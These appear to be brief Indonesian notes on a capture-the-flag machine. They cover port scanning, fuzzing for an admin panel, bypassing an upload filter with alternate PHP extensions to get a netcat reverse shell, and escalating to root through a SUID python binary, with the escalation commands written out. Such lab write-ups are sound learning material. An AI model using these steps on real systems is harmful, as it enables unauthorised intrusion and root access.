1. scan nmap 80 22 kebuka -> fuzz /panel ada
2. test upload manip ekstensi pakai burp gabisa -> ekstensi .php#.png juga gabisa -> .php langsung gabisa
3. tes pakai .php3 - 8 .phps .phtml dll dll -> nc revshellnya
4. masuk shell di /home /opt gada apa apa ->  find / -perm -u=s 2>/dev/null -> python sus cari di gtfo
5. cari yg suid -> install -m =xs $(which python) . -> python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
6. inget jangan ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")' -> soalnya gitu gabisa
7. dah klaim root
